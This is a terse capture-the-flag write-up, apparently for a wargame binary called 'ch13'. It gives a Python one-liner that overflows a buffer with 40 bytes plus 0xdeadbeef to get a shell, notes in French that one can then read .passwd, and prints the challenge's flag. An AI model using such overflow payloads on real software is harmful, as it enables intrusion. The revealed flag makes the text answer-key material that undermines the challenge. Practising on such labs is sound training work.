 (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + b"\xef\xbe\xad\xde" + b"\n")'; cat) | ./ch13

 Une fois le shell ouvert, on peut cat .passwd

 1w4ntm0r3pr0np1s